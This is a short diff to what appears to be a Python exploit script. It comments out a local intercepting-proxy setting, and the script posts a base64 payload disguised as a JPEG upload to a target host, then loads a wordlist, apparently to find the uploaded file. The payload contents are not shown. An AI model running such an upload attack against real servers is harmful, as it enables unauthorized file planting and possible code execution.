@@ -4,10 +4,10 @@ import argparse
 import base64
 
 
-proxies = {
-  "http":  "http://127.0.0.1:8080",
-  "https": "http://127.0.0.1:8080",
-}
+# proxies = {
+#   "http":  "http://127.0.0.1:8080",
+#   "https": "http://127.0.0.1:8080",
+# }
 
 def main():
   session = requests.Session()
@@ -15,7 +15,7 @@ def main():
   rawBody = "{\"name\":\"test2.jpg\",\"type\":\"image/jpeg\",\"file\":\"data:image/jpeg;base64,"+ b64payload.decode('utf-8')+"\"}"
   print(rawBody)
   headers = {f"Origin":"{target}","X-Requested-With":"XMLHttpRequest","Content-Type":"application/json"}
-  session.post(f"http://{target}/", data=rawBody, headers=headers,proxies=proxies)
+  session.post(f"http://{target}/", data=rawBody, headers=headers)#,proxies=proxies)
 
   with open(wordlist) as f:
     alist = [line.rstrip() for line in f]
